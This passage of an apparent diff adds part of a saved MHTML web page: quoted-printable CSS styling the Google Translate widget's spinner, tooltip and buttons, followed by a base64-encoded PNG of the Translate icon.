+ntent: center; width: 104px; height: 104px; border-radius: 50px; background=
+: url("//www.gstatic.com/images/branding/product/2x/translate_24dp.png") 50=
+% 50% no-repeat rgb(255, 255, 255); transition: all 0.6s ease-in-out 0s; tr=
+ansform: scale(0.4); opacity: 0; }
+
+.goog-te-spinner-animation-show { transform: scale(0.5); opacity: 1; }
+
+.goog-te-spinner { margin: 2px 0px 0px 2px; animation: 1.4s linear 0s infin=
+ite normal none running goog-te-spinner-rotator; }
+
+@keyframes goog-te-spinner-rotator {=20
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(270deg); }
+}
+
+.goog-te-spinner-path { stroke-dasharray: 187; stroke-dashoffset: 0; stroke=
+: rgb(66, 133, 244); transform-origin: center center; animation: 1.4s ease-=
+in-out 0s infinite normal none running goog-te-spinner-dash; }
+
+@keyframes goog-te-spinner-dash {=20
+  0% { stroke-dashoffset: 187; }
+  50% { stroke-dashoffset: 46.75; transform: rotate(135deg); }
+  100% { stroke-dashoffset: 187; transform: rotate(450deg); }
+}
+
+#goog-gt-tt html, #goog-gt-tt body, #goog-gt-tt div, #goog-gt-tt span, #goo=
+g-gt-tt iframe, #goog-gt-tt h1, #goog-gt-tt h2, #goog-gt-tt h3, #goog-gt-tt=
+ h4, #goog-gt-tt h5, #goog-gt-tt h6, #goog-gt-tt p, #goog-gt-tt a, #goog-gt=
+-tt img, #goog-gt-tt ol, #goog-gt-tt ul, #goog-gt-tt li, #goog-gt-tt table,=
+ #goog-gt-tt form, #goog-gt-tt tbody, #goog-gt-tt tr, #goog-gt-tt td { marg=
+in: 0px; padding: 0px; border: 0px; font-style: inherit; font-variant: inhe=
+rit; font-weight: inherit; font-stretch: inherit; font-size: inherit; font-=
+family: inherit; vertical-align: baseline; text-align: left; line-height: n=
+ormal; }
+
+#goog-gt-tt ol, #goog-gt-tt ul { list-style: none; }
+
+#goog-gt-tt table { border-collapse: collapse; border-spacing: 0px; }
+
+#goog-gt-tt caption, #goog-gt-tt th, #goog-gt-tt td { text-align: left; fon=
+t-weight: normal; }
+
+div#goog-gt-tt { padding: 10px 14px; }
+
+#goog-gt-tt { color: rgb(34, 34, 34); background-color: rgb(255, 255, 255);=
+ border: 1px solid rgb(238, 238, 238); box-shadow: rgba(0, 0, 0, 0.2) 0px 4=
+px 16px; display: none; font-family: arial; font-size: 10pt; width: 420px; =
+padding: 12px; position: absolute; z-index: 10000; }
+
+#goog-gt-tt .original-text, .gt-hl-layer { clear: both; font-size: 10pt; po=
+sition: relative; text-align: justify; width: 100%; }
+
+#goog-gt-tt .title { color: rgb(153, 153, 153); font-family: arial, sans-se=
+rif; margin: 4px 0px; text-align: left; }
+
+#goog-gt-tt .close-button { display: none; }
+
+#goog-gt-tt .logo { float: left; margin: 0px; }
+
+#goog-gt-tt .activity-links { display: inline-block; }
+
+#goog-gt-tt .started-activity-container { display: none; width: 100%; }
+
+#goog-gt-tt .activity-root { margin-top: 20px; }
+
+#goog-gt-tt .left { float: left; }
+
+#goog-gt-tt .right { float: right; }
+
+#goog-gt-tt .bottom { min-height: 15px; position: relative; height: 1%; }
+
+#goog-gt-tt .status-message { background: rgb(41, 145, 13); border-radius: =
+4px; box-shadow: rgb(30, 102, 9) 0px 2px 2px inset; color: white; font-size=
+: 9pt; font-weight: bolder; margin-top: 12px; padding: 6px; text-shadow: rg=
+b(30, 102, 9) 1px 1px 1px; }
+
+#goog-gt-tt .activity-link { color: rgb(17, 85, 204); cursor: pointer; font=
+-family: arial; font-size: 11px; margin-right: 15px; text-decoration: none;=
+ }
+
+#goog-gt-tt textarea { font-family: arial; resize: vertical; width: 100%; m=
+argin-bottom: 10px; border-radius: 1px; border-width: 1px; border-style: so=
+lid; border-color: silver rgb(217, 217, 217) rgb(217, 217, 217); border-ima=
+ge: initial; font-size: 13px; height: auto; overflow-y: auto; padding: 1px;=
+ }
+
+#goog-gt-tt textarea:focus { box-shadow: rgba(0, 0, 0, 0.3) 0px 1px 2px ins=
+et; border: 1px solid rgb(77, 144, 254); outline: none; }
+
+#goog-gt-tt .activity-cancel { margin-right: 10px; }
+
+#goog-gt-tt .translate-form { min-height: 25px; vertical-align: middle; pad=
+ding-top: 8px; }
+
+#goog-gt-tt .translate-form .activity-form { margin-bottom: 0px; }
+
+#goog-gt-tt .translate-form .activity-form input { display: inline-block; m=
+in-width: 54px; border: 1px solid rgba(0, 0, 0, 0.1); text-align: center; c=
+olor: rgb(68, 68, 68); font-size: 11px; font-weight: bold; height: 27px; ou=
+tline: 0px; padding: 0px 8px; vertical-align: middle; line-height: 27px; ma=
+rgin: 0px 16px 0px 0px; box-shadow: rgba(0, 0, 0, 0.1) 0px 1px 2px; border-=
+radius: 2px; transition: all 0.218s ease 0s; background-color: rgb(245, 245=
+, 245); background-image: -webkit-linear-gradient(top, rgb(245, 245, 245), =
+rgb(241, 241, 241)); user-select: none; cursor: default; }
+
+#goog-gt-tt .translate-form .activity-form input:hover { border: 1px solid =
+rgb(198, 198, 198); color: rgb(34, 34, 34); transition: all 0s ease 0s; bac=
+kground-color: rgb(248, 248, 248); background-image: -webkit-linear-gradien=
+t(top, rgb(248, 248, 248), rgb(241, 241, 241)); }
+
+#goog-gt-tt .translate-form .activity-form input:active { border: 1px solid=
+ rgb(198, 198, 198); color: rgb(51, 51, 51); background-color: rgb(246, 246=
+, 246); background-image: -webkit-linear-gradient(top, rgb(246, 246, 246), =
+rgb(241, 241, 241)); }
+
+#goog-gt-tt .translate-form .activity-form input:focus, #goog-gt-tt .transl=
+ate-form .activity-form input.focus { outline: none; border: 1px solid rgb(=
+77, 144, 254); z-index: 4 !important; }
+
+#goog-gt-tt .translate-form .activity-form input.selected { background-colo=
+r: rgb(238, 238, 238); background-image: -webkit-linear-gradient(top, rgb(2=
+38, 238, 238), rgb(224, 224, 224)); box-shadow: rgba(0, 0, 0, 0.1) 0px 1px =
+2px inset; border: 1px solid rgb(204, 204, 204); color: rgb(51, 51, 51); }
+
+#goog-gt-tt .translate-form .activity-form input.activity-submit { color: w=
+hite; border-color: rgb(48, 121, 237); background-color: rgb(77, 144, 254);=
+ background-image: -webkit-linear-gradient(top, rgb(77, 144, 254), rgb(71, =
+135, 237)); }
+
+#goog-gt-tt .translate-form .activity-form input.activity-submit:hover #goo=
+g-gt-tt .translate-form .activity-form input.activity-submit:focus, #goog-g=
+t-tt .translate-form .activity-form input.activity-submit.focus #goog-gt-tt=
+ .translate-form .activity-form input.activity-submit:active { border-color=
+: rgb(48, 121, 237); background-color: rgb(53, 122, 232); background-image:=
+ -webkit-linear-gradient(top, rgb(77, 144, 254), rgb(53, 122, 232)); }
+
+#goog-gt-tt .translate-form .activity-form input.activity-submit:hover { bo=
+x-shadow: rgb(255, 255, 255) 0px 0px 0px 1px inset, rgba(0, 0, 0, 0.1) 0px =
+1px 1px; }
+
+#goog-gt-tt .translate-form .activity-form input:focus, #goog-gt-tt .transl=
+ate-form .activity-form input.focus, #goog-gt-tt .translate-form .activity-=
+form input:active, #goog-gt-tt .translate-form .activity-form input:hover, =
+#goog-gt-tt .translate-form .activity-form input.activity-submit:focus, #go=
+og-gt-tt .translate-form .activity-form input.activity-submit.focus, #goog-=
+gt-tt .translate-form .activity-form input.activity-submit:active, #goog-gt=
+-tt .translate-form .activity-form input.activity-submit:hover { border-col=
+or: rgb(48, 121, 237); }
+
+#goog-gt-tt .gray { color: rgb(153, 153, 153); font-family: arial, sans-ser=
+if; }
+
+#goog-gt-tt .alt-helper-text { color: rgb(153, 153, 153); font-size: 11px; =
+font-family: arial, sans-serif; margin: 15px 0px 5px; }
+
+#goog-gt-tt .alt-error-text { color: rgb(136, 0, 0); display: none; font-si=
+ze: 9pt; }
+
+.goog-text-highlight { background-color: rgb(201, 215, 241); box-shadow: rg=
+b(153, 153, 170) 2px 2px 4px; box-sizing: border-box; position: relative; }
+
+#goog-gt-tt .alt-menu.goog-menu { background: rgb(255, 255, 255); border: 1=
+px solid rgb(221, 221, 221); box-shadow: rgb(153, 153, 170) 0px 2px 4px; mi=
+n-width: 0px; outline: none; padding: 0px; position: absolute; z-index: 200=
+0; }
+
+#goog-gt-tt .alt-menu .goog-menuitem { cursor: pointer; padding: 2px 5px 5p=
+x; margin-right: 0px; border-style: none; }
+
+#goog-gt-tt .alt-menu div.goog-menuitem:hover { background: rgb(221, 221, 2=
+21); }
+
+#goog-gt-tt .alt-menu .goog-menuitem h1 { font-size: 100%; font-weight: bol=
+d; margin: 4px 0px; }
+
+#goog-gt-tt .alt-menu .goog-menuitem strong { color: rgb(52, 90, 173); }
+
+#goog-gt-tt .goog-submenu-arrow { text-align: right; position: absolute; ri=
+ght: 0px; left: auto; }
+
+#goog-gt-tt .goog-menuitem-rtl .goog-submenu-arrow { text-align: left; posi=
+tion: absolute; left: 0px; right: auto; }
+
+#goog-gt-tt .gt-hl-text, #goog-gt-tt .trans-target-highlight { background-c=
+olor: rgb(241, 234, 0); border-radius: 4px; box-shadow: rgba(0, 0, 0, 0.5) =
+3px 3px 4px; box-sizing: border-box; color: rgb(241, 234, 0); cursor: point=
+er; margin: -2px -2px -2px -3px; padding: 2px 2px 2px 3px; position: relati=
+ve; }
+
+#goog-gt-tt .trans-target-highlight { color: rgb(34, 34, 34); }
+
+#goog-gt-tt .gt-hl-layer { color: white; position: absolute !important; }
+
+#goog-gt-tt .trans-target, #goog-gt-tt .trans-target .trans-target-highligh=
+t { background-color: rgb(201, 215, 241); border-radius: 4px 4px 0px 0px; b=
+ox-shadow: rgba(0, 0, 0, 0.5) 3px 3px 4px; box-sizing: border-box; cursor: =
+pointer; margin: -2px -2px -2px -3px; padding: 2px 2px 3px 3px; position: r=
+elative; }
+
+#goog-gt-tt span:focus { outline: none; }
+
+#goog-gt-tt .trans-edit { background-color: transparent; border: 1px solid =
+rgb(77, 144, 254); border-radius: 0em; margin: -2px; padding: 1px; }
+
+#goog-gt-tt .gt-trans-highlight-l { border-left: 2px solid red; margin-left=
+: -2px; }
+
+#goog-gt-tt .gt-trans-highlight-r { border-right: 2px solid red; margin-rig=
+ht: -2px; }
+
+#goog-gt-tt #alt-input { padding: 2px; }
+
+#goog-gt-tt #alt-input-text { font-size: 11px; padding: 2px 2px 3px; margin=
+: 0px; background-color: rgb(255, 255, 255); color: rgb(51, 51, 51); border=
+-width: 1px; border-style: solid; border-color: rgb(192, 192, 192) rgb(217,=
+ 217, 217) rgb(217, 217, 217); border-image: initial; display: inline-block=
+; vertical-align: top; height: 21px; box-sizing: border-box; border-radius:=
+ 1px; }
+
+#goog-gt-tt #alt-input-text:hover { border-width: 1px; border-style: solid;=
+ border-color: rgb(160, 160, 160) rgb(185, 185, 185) rgb(185, 185, 185); bo=
+rder-image: initial; box-shadow: rgba(0, 0, 0, 0.1) 0px 1px 2px inset; }
+
+#goog-gt-tt #alt-input-text:focus { box-shadow: rgba(0, 0, 0, 0.3) 0px 1px =
+2px inset; outline: none; border: 1px solid rgb(77, 144, 254); }
+
+#goog-gt-tt #alt-input-submit { font-size: 11px; padding: 2px 6px 3px; marg=
+in: 0px 0px 0px 2px; height: 21px; }
+------MultipartBoundary--cMcMRR2qLVMG9r5frlSI25A3ondTpnTpM8CpkvI0yM----
+Content-Type: image/png
+Content-Transfer-Encoding: base64
+Content-Location: https://www.gstatic.com/images/branding/product/1x/translate_24dp.png
+
+iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAADAElEQVR4Ab2TA5djWRRGaxlj/51h
+27Zt23xltG3btrtj2zbHM9/c87LuvKCNumvtYrL3zTlJVaucIeuz/bs3pv/s1ZRHT0YPTmMe3Rnd
+GvLoypiwPvzxWwVI3rs5j1cFOq32dHurAIm5nJDkpYHOq2O33irAxS+8PaeesfTW528c+F/6gttz
+OVFz1AebzQu/P4BQKIRgMCgSCARE/H4/8YfF7upZGmiUKJfzQBfGsPUJPJPp4PX6mTjE5eUB+Hy+
+36VAmXjt6Sz0rhRi8SSM7Pvqk1lRTnSuy+PUVR10OjOT+F8YIKR3UbH8VBaJZBKH72ew9GgWh++l
+Mf9QjstF1hxwQSbTwGy2kvTVARoFR+9M4fjDdMnci+WdGENa4nj8RAWt1sD2YSPZ80YkBUjGobGs
+OZUVxTtvZJBMJkUMrhTJC9TSmLRQqfUwGIwYuaSW7cTLqQyQjEOik48y4q0Hb8hh0q4cHuhTuKdL
+cTk6MnouvoEhcwQMW7AWIxYJGLW0FmNWNGDMysbKAMk4tFDawZEHaSw/nsUhtgv6fRn7mcuJQc1x
+bNl/GvceydguzBC27sPJSzdIzJECfL4citAu4okkjO4UhNOl8g41ObRnCNuuYEH9dpy7fhszq9ez
+kAVOp/PFgU7l1EqUy4lV+5yYV7MVIxbW4Mb9x7RwEZfLRbuQAqXSF4olOVGdQ/+GKEYvbMDMtRuw
+8cAxWK1WMeBwOOiVSIEXSEvE5XKiHaNhzy08fabCwqatLHKCBwgp0LY2/UfHNxQTbYUcVrIxyeQa
+qDV6LG7ejqt3HsBut5cGugnBPr+sjv/eXsiA066ctWmRtgXQZk2Bgc0RKJRaGI0mmMzmkjFVvemZ
+Mv/Mdz/2PIcfehT4vvs5rKi9Jd7eZDLDYrEQbx+gM3zKlehPvS6BWFF3G3I2Hq2OAib6PPAAjent
+AouEO4t/7s3ktYXlKpUa6MoChTHZf3+rwLx5175aUXMLDx/JIJMpoVZrodVqodfrRQwGAwV/v3L9
+ab+q1jj/Aa5bwO+xfluQAAAAAElFTkSuQmCC
+
+------MultipartBoundary--cMcMRR2qLVMG9r5frlSI25A3ondTpnTpM8CpkvI0yM------
